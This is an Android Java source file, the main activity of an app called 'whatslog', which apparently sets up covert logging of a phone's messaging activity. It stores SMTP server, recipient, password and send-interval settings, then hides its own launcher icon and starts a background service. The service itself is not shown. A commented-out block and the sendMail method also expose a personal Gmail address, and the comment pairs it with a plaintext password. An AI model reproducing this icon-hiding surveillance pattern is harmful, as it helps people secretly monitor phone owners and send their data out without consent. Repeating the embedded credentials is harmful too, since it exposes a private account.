package com.android.whatslog;

import java.sql.SQLException;
import java.util.List;

import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.EditText;
import android.widget.Toast;

import com.android.whatslog.dao.DatabaseHelperConfiguracao;
import com.android.whatslog.dao.DatabaseHelperInternal;
import com.android.whatslog.model.Configuracao;
import com.j256.ormlite.android.apptools.OrmLiteBaseActivity;

public class MainActivity extends OrmLiteBaseActivity<DatabaseHelperInternal> {

	private EditText smtp;
	private EditText intervalo;
	private EditText to;
	private EditText password;
	private EditText dialer;
	private EditText subject;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);

		if (isFirstTime()) {
			setContentView(R.layout.conf);
			smtp = (EditText) findViewById(R.configuracao.smtp);
			intervalo = (EditText) findViewById(R.configuracao.intervalo);
			to = (EditText) findViewById(R.configuracao.to);
			password = (EditText) findViewById(R.configuracao.password);
			dialer = (EditText) findViewById(R.configuracao.dialer);
			subject = (EditText) findViewById(R.configuracao.subject);

		} else {
			setContentView(R.layout.main);
		}
	}

	@Override
	public boolean onMenuItemSelected(int featureId, MenuItem item) {
		switch (item.getItemId()) {
		case R.id.action_settings:
			Intent intent = new Intent(this, ConfActivity.class);
			setIntent(intent);
			startActivity(intent);
			return true;
		default:
			return super.onMenuItemSelected(featureId, item);
		}
	}

	// Start the service
	public void startNewService(View view) {
		startService(new Intent(this, MyService.class));
	}

	// Stop the service
	public void stopNewService(View view) {
		stopService(new Intent(this, MyService.class));
	}

	private boolean isFirstTime() {
		DatabaseHelperConfiguracao database = new DatabaseHelperConfiguracao(
				this);
		List<Configuracao> confs;
		try {
			confs = database.getDao().queryForAll();
			if (confs.size() > 0) {
				return false;
			}
			return true;
		} catch (SQLException e) {
			return false;
		}

	}

	public void showLog(View view) {

		// GMailSender sender = new
		// GMailSender("bruno.teixeira.canto@gmail.com", "apolinario");
		// try {
		// sender.sendMail("This is Subject",
		// "This is Body",
		// "bruno.teixeira.canto@gmail.com",
		// "bruno.teixeira.canto@gmail.com");
		// } catch (Exception e) {
		// // TODO Auto-generated catch block
		// e.printStackTrace();
		// }

		Intent intent = new Intent(this, LogActivity.class);
		setIntent(intent);
		startActivityForResult(intent, 1);
	}

	public void sendMail(View view) {
		Intent emailIntent = new Intent(android.content.Intent.ACTION_SEND);
		emailIntent.putExtra(android.content.Intent.EXTRA_EMAIL,
				"bruno.teixeira.canto@gmail.com");
		emailIntent.putExtra(android.content.Intent.EXTRA_SUBJECT, "teste");
		emailIntent.setType("plain/text");
		emailIntent.putExtra(android.content.Intent.EXTRA_TEXT, "teste");
		startActivity(emailIntent);
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

	public void save(View view) {
		if (validate()) {
			try {
				DatabaseHelperConfiguracao database = new DatabaseHelperConfiguracao(
						this);

				List<Configuracao> confs = database.getDao().queryForAll();
				Configuracao conf = new Configuracao();

				if (confs.size() > 0) {
					conf = confs.get(0);
				}

				conf.setEmailTo(to.getText().toString());
				conf.setPassword(password.getText().toString());
				conf.setSmtpMail(smtp.getText().toString());
				conf.setFirstTime(false);
				conf.setIntervalo(Integer.parseInt(intervalo.getText()
						.toString()));
				conf.setDialer(dialer.getText().toString());
				conf.setSubject(subject.getText().toString());

				database.getDao().createOrUpdate(conf);

				//hide icon
				PackageManager p = getPackageManager();
				p.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);

				startService(new Intent(this, MyService.class));

				finish();

			} catch (SQLException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
	}

	private boolean validate() {
		if (to.getText().toString().length()==0
				|| password.getText().toString().length()==0
				|| subject.getText().toString().length()==0
				|| smtp.getText().toString().length()==0
				|| intervalo.getText().toString().length()==0
				|| dialer.getText().toString().length()==0) {
			Toast.makeText(this, "All fields is required!", Toast.LENGTH_LONG).show();
			return false;
		}
		return true;
	}

}
